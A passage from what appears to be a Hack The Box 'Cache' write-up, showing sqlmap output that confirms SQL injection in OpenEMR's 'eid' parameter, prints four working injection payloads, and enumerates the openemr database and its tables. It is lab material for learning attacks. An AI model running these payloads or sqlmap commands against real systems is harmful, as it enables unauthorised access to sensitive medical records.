a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">[09:53:27] [INFO] checking if the target is protected by some kind of WAF/IPS</span><br><span class="line">[09:53:28] [INFO] testing if the target URL content is stable</span><br><span class="line">[09:53:29] [INFO] target URL content is stable</span><br><span class="line">[09:53:29] [INFO] testing if GET parameter &#x27;eid&#x27; is dynamic</span><br><span class="line">[09:53:29] [WARNING] GET parameter &#x27;eid&#x27; does not appear to be dynamic</span><br><span class="line">[09:53:30] [INFO] heuristic (basic) test shows that GET parameter &#x27;eid&#x27; might be injectable (possible DBMS: &#x27;MySQL&#x27;)</span><br><span class="line">[09:53:30] [INFO] testing for SQL injection on GET parameter &#x27;eid&#x27;</span><br><span class="line">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span><br><span class="line">[09:53:30] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br><span class="line">[09:53:30] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[09:53:34] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br><span class="line">[09:53:35] [INFO] GET parameter &#x27;eid&#x27; appears to be &#x27;Boolean-based blind - Parameter replace (original value)&#x27; injectable (with --not-string=&quot;row&quot;)</span><br><span class="line">[09:53:35] [INFO] testing &#x27;Generic inline queries&#x27;</span><br><span class="line">[09:53:35] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;</span><br><span class="line">[09:53:35] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;</span><br><span class="line">[09:53:36] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;</span><br><span class="line">[09:53:36] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;</span><br><span class="line">[09:53:36] [INFO] testing &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;</span><br><span class="line">[09:53:37] [INFO] GET parameter &#x27;eid&#x27; is &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27; injectable </span><br><span class="line">[09:53:37] [INFO] testing &#x27;MySQL inline queries&#x27;</span><br><span class="line">[09:53:37] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;</span><br><span class="line">[09:53:37] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                     </span><br><span class="line">[09:53:40] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;</span><br><span class="line">[09:53:40] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;</span><br><span class="line">[09:53:41] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;</span><br><span class="line">[09:53:42] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (heavy query - comment)&#x27;</span><br><span class="line">[09:53:42] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (heavy query)&#x27;</span><br><span class="line">[09:53:43] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span><br><span class="line">[09:53:54] [INFO] GET parameter &#x27;eid&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable </span><br><span class="line">[09:53:54] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span><br><span class="line">[09:53:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">[09:53:55] [INFO] &#x27;ORDER BY&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span><br><span class="line">[09:53:56] [INFO] target URL appears to have 4 columns in query</span><br><span class="line">[09:53:57] [INFO] GET parameter &#x27;eid&#x27; is &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable</span><br><span class="line">GET parameter &#x27;eid&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[09:53:57] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[09:53:59] [INFO] fetching database names</span><br><span class="line">[09:54:00] [INFO] retrieved: &#x27;information_schema&#x27;</span><br><span class="line">[09:54:00] [INFO] retrieved: &#x27;openemr&#x27;</span><br><span class="line">available databases [2]:                                                                                                                                    </span><br><span class="line">[*] information_schema</span><br><span class="line">[*] openemr</span><br><span class="line"></span><br><span class="line">[09:54:00] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 09:54:00 /2020-10-01/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h3 id="2-çˆ†è¡¨"><a href="#2-çˆ†è¡¨" class="headerlink" title="2.çˆ†è¡¨"></a>2.çˆ†è¡¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp -D openemr --tables --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                 </span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.9#stable&#125;                                                                                                                     </span><br><span class="line">|_ -| . [,]     | .&#x27;| . |                                                                                                                                    </span><br><span class="line">|___|_  [.]_|_|_|__,|  _|                                                                                                                                    </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                  </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 09:57:20 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[09:57:20] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[09:57:20] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[09:57:20] [INFO] testing connection to the target URL</span><br><span class="line">[09:57:21] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[09:57:21] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[09:57:21] [INFO] fetching tables for database: &#x27;openemr&#x27;</span><br><span class="line">[09:57:22] [INFO] retrieved: &#x27;addresses&#x27;</span><br><span class="line">[09:57:22] [INFO] retrieved: &#x27;amc_misc_data&#x27;</span><br><span class="line">[09:57:22] [INFO] retrieved: &#x27;amendments&#x27;</span><br><span class="line">[09:57:23] [INFO] retrieved: &#x27;amendments_history&#x27;</span><br><span class="line">[09:57:23] [INFO] retrieved: &#x27;ar_activity&#x27;</span><br><span class="line">[09:57:23] [INFO] retrieved: &#x27;ar_session&#x27;</span><br><span class="line">[09:57:24] [INFO] retrieved: &#x27;array&#x27;</span><br><span class="line">[09:57:24] [INFO] retrieved: &#x27;audit_details&#x27;</span><br><span class="line">[09:57:24] [INFO] retrieved: &#x27;audit_master&#x27;</span><br><span class="line">[09:57:25] [INFO] retrieved: &#x27;automatic_notification&#x27;</span><br><span class="line">[09:57:25] [INFO] retrieved: &#x27;background_services&#x27;</span><br><span class="line">[09:57:25] [INFO] retrieved: &#x27;batchcom&#x27;</span><br><span class="line">[09:57:26] [INFO] retrieved: &#x27;billing&#x27;</span><br><span class="line">[09:57:26] [INFO] retrieved: &#x27;calendar_external&#x27;</span><br><span class="line">[09:57:26] [INFO] retrieved: &#x27;categories&#x27;</span><br><span class="line">[09:57:27] [INFO] retrieved: &#x27;categories_seq&#x27;</span><br><span class="line">[09:57:27] [INFO] retrieved: &#x27;categories_to_documents&#x27;</span><br><span class="line">[09:57:27] [INFO] retrieved: &#x27;ccda&#x27;</span><br><span class="line">[09:57:28] [INFO] retrieved: &#x27;ccda_components&#x27;</span><br><span class="line">[09:57:28] [INFO] retrieved: &#x27;ccda_field_mapping&#x27;</span><br><span class="line">[09:57:28] [INFO] retrieved: &#x27;ccda_sections&#x27;</span><br><span class="line">[09:57:29] [INFO] retrieved: &#x27;ccda_table_mapping&#x27;</span><br><span class="line">[09:57:29] [INFO] retrieved: &#x27;chart_tracker&#x27;</span><br><span class="line">[09:57:29] [INFO] retrieved: &#x27;claims&#x27;</span><br><span class="line">[09:57:30] [INFO] retrieved: &#x27;clinical_plans&#x27;</span><br><span class="line">[09:57:30] [INFO] retrieved: &#x27;clinical_plans_rules&#x27;</span><br><span class="line">[09:57:31] [INFO] retrieved: &#x27;clinical_rules&#x27;</span><br><span class="line">[09:57:31] [INFO] retrieved: &#x27;clinical_rules_log&#x27;</span><br><span class="line">[09:57:31] [INFO] retrieved: &#x27;code_types&#x27;</span><br><span class="line">[09:57:32] [INFO] retrieved: &#x27;codes&#x27;</span><br><span class="line">[09:57:32] [INFO] retrieved: &#x27;codes_history&#x27;</span><br><span class="line">[09:57:33] [INFO] retrieved: &#x27;config&#x27;</span><br><span class="line">[09:57:33] [INFO] retrieved: &#x27;config_seq&#x27;</span><br><span class="line">[09:57:33] [INFO] retrieved: &#x27;customlists&#x27;</span><br><span class="line">[09:57:34] [INFO] retrieved: &#x27;dated_reminders&#x27;</span><br><span class="line">[09:57:34] [INFO] retrieved: &#x27;dated_reminders_link&#x27;</span><br><span class="line">[09:57:34] [INFO] retrieved: &#x27;direct_message_log&#x27;</span><br><span class="line">[09:57:35] [INFO] retrieved: &#x27;documents&#x27;</span><br><span class="line">[09:57:35] [INFO] retrieved: &#x27;documents_legal_categories&#x27;</span><br><span class="line">[09:57:35] [INFO] retrieved: &#x27;documents_legal_detail&#x27;</span><br><span class="line">[09:57:36] [INFO] retrieved: &#x27;documents_legal_master&#x27;</span><br><span class="line">[09:57:36] [INFO] retrieved: &#x27;drug_inventory&#x27;</span><br><span class="line">[09:57:37] [INFO] retrieved: &#x27;drug_sales&#x27;</span><br><span class="line">[09:57:37] [INFO] retrieved: &#x27;drug_templates&#x27;</span><br><span class="line">[09:57:37] [INFO] retrieved: &#x27;drugs&#x27;</span><br><span class="line">[09:57:38] [INFO] retrieved: &#x27;eligibility_response&#x27;</span><br><span class="line">[09:57:38] [INFO] retrieved: &#x27;eligibility_verification&#x27;</span><br><span class="line">[09:57:38] [INFO] retrieved: &#x27;employer_data&#x27;</span><br><span class="line">[09:57:39] [INFO] retrieved: &#x27;enc_category_map&#x27;</span><br><span class="line">[09:57:39] [INFO] retrieved: &#x27;erx_drug_paid&#x27;</span><br><span class="line">[09:57:39] [INFO] retrieved: &#x27;erx_narcotics&#x27;</span><br><span class="line">[09:57:40] [INFO] retrieved: &#x27;erx_rx_log&#x27;</span><br><span class="line">[09:57:40] [INFO] retrieved: &#x27;erx_ttl_touch&#x27;</span><br><span class="line">[09:57:41] [INFO] retrieved: &#x27;esign_signatures&#x27;</span><br><span class="line">[09:57:41] [INFO] retrieved: &#x27;extended_log&#x27;</span><br><span class="line">[09:57:41] [INFO] retrieved: &#x27;external_encounters&#x27;</span><br><span class="line">[09:57:42] [INFO] retrieved: &#x27;external_procedures&#x27;</span><br><span class="line">[09:57:42] [INFO] retrieved: &#x27;facility&#x27;</span><br><span class="line">[09:57:42] [INFO] retrieved: &#x27;facility_user_ids&#x27;</span><br><span class="line">[09:57:43] [INFO] retrieved: &#x27;fee_sheet_options&#x27;</span><br><span class="line">[09:57:43] [INFO] retrieved: &#x27;form_care_plan&#x27;</span><br><span class="line">[09:57:43] [INFO] retrieved: &#x27;form_clinical_instructions&#x27;</span><br><span class="line">[09:57:44] [INFO] retrieved: &#x27;form_dictation&#x27;</span><br><span class="line">[09:57:44] [INFO] retrieved: &#x27;form_encounter&#x27;</span><br><span class="line">[09:57:44] [INFO] retrieved: &#x27;form_eye_mag&#x27;</span><br><span class="line">[09:57:45] [INFO] retrieved: &#x27;form_eye_mag_dispense&#x27;</span><br><span class="line">[09:57:45] [INFO] retrieved: &#x27;form_eye_mag_impplan&#x27;</span><br><span class="line">[09:57:46] [INFO] retrieved: &#x27;form_eye_mag_orders&#x27;</span><br><span class="line">[09:57:46] [INFO] retrieved: &#x27;form_eye_mag_prefs&#x27;</span><br><span class="line">[09:57:46] [INFO] retrieved: &#x27;form_eye_mag_wearing&#x27;</span><br><span class="line">[09:57:47] [INFO] retrieved: &#x27;form_functional_cognitive_status&#x27;</span><br><span class="line">[09:57:47] [INFO] retrieved: &#x27;form_group_attendance&#x27;</span><br><span class="line">[09:57:48] [INFO] retrieved: &#x27;form_groups_encounter&#x27;</span><br><span class="line">[09:57:48] [INFO] retrieved: &#x27;form_misc_billing_options&#x27;</span><br><span class="line">[09:57:48] [INFO] retrieved: &#x27;form_observation&#x27;</span><br><span class="line">[09:57:49] [INFO] retrieved: &#x27;form_reviewofs&#x27;</span><br><span class="line">[09:57:49] [INFO] retrieved: &#x27;form_ros&#x27;</span><br><span class="line">[09:57:50] [INFO] retrieved: &#x27;form_soap&#x27;</span><br><span class="line">[09:57:51] [INFO] retrieved: &#x27;form_taskman&#x27;</span><br><span class="line">[09:57:52] [INFO] retrieved: &#x27;form_vitals&#x27;</span><br><span class="line">[09:57:52] [INFO] retrieved: &#x27;forms&#x27;</span><br><span class="line">[09:57:52] [INFO] retrieved: &#x27;gacl_acl&#x27;</span><br><span class="line">[09:57:53] [INFO] retrieved: &#x27;gacl_acl_sections&#x27;</span><br><span class="line">[09:57:53] [INFO] retrieved: &#x27;gacl_acl_seq&#x27;</span><br><span class="line">[09:57:53] [INFO] retrieved: &#x27;gacl_aco&#x27;</span><br><span class="line">[09:57:54] [INFO] retrieved: &#x27;gacl_aco_map&#x27;</span><br><span class="line">[09:57:54] [INFO] retrieved: &#x27;gacl_aco_sections&#x27;</span><br><span class="line">[09:57:54] [INFO] retrieved: &#x27;gacl_aco_sections_seq&#x27;</span><br><span class="line">[09:57:55] [INFO] retrieved: &#x27;gacl_aco_seq&#x27;</span><br><span class="line">[09:57:55] [INFO] retrieved: &#x27;gacl_aro&#x27;</span><br><span class="line">[09:57:55] [INFO] retrieved: &#x27;gacl_aro_groups&#x27;</span><br><span class="line">[09:57:56] [INFO] retrieved: &#x27;gacl_aro_groups_id_seq&#x27;</span><br><span class="line">[09:57:56] [INFO] retrieved: &#x27;gacl_aro_groups_map&#x27;</span><br><span class="line">[09:57:56] [INFO] retrieved: &#x27;gacl_aro_map&#x27;</span><br><span class="line">[09:57:57] [INFO] retrieved: &#x27;gacl_aro_sections&#x27;</span><br><span class="line">[09:57:57] [INFO] retrieved: &#x27;gacl_aro_sections_seq&#x27;</span><br><span class="line">[09:57:57] [INFO] retrieved: &#x27;gacl_aro_seq&#x27;</span><br><span class="line">[09:57:58] [INFO] retrieved: &#x27;gacl_axo&#x27;</span><br><span class="line">[09:57:58] [INFO] retrieved: &#x27;gacl_axo_groups&#x27;</span><br><span class="line">[09:57:58] [INFO] retrieved: &#x27;gacl_axo_groups_map&#x27;</span><br><span class="line">[09:57:59] [INFO] retrieved: &#x27;gacl_axo_map&#x27;</span><br><span class="line">[09:57:59] [INFO] retrieved: &#x27;gacl_axo_sections&#x27;</span><br><span class="line">[09:58:00] [INFO] retrieved: &#x27;gacl_groups_aro_map&#x27;</span><br><span class="line">[09:58:00] [INFO] retrieved: 